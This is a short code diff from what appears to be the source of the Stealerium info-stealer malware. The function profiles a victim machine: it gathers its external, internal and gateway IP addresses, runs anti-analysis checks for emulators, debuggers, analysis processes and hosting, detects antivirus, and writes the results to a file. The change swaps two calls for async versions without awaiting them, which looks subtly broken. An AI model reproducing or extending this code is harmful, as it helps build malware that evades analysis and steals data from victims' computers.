@@ -13,7 +13,7 @@ namespace Stealerium.Target.System
             {
                 var systemInfoText = ""
                                      + "\n[IP]"
-                                     + "\nExternal IP: " + SystemInfo.GetPublicIp()
+                                     + "\nExternal IP: " + SystemInfo.GetPublicIpAsync()
                                      + "\nInternal IP: " + SystemInfo.GetLocalIp()
                                      + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
                                      + "\n"
@@ -35,7 +35,7 @@ namespace Stealerium.Target.System
                                      + "\nEmulator: " + AntiAnalysis.Emulator()
                                      + "\nDebugger: " + AntiAnalysis.Debugger()
                                      + "\nProcesse: " + AntiAnalysis.Processes()
-                                     + "\nHosting: " + AntiAnalysis.Hosting()
+                                     + "\nHosting: " + AntiAnalysis.HostingAsync()
                                      + "\nAntivirus: " + SystemInfo.GetAntivirus()
                                      + "\n";
                 File.WriteAllText(sSavePath, systemInfoText);
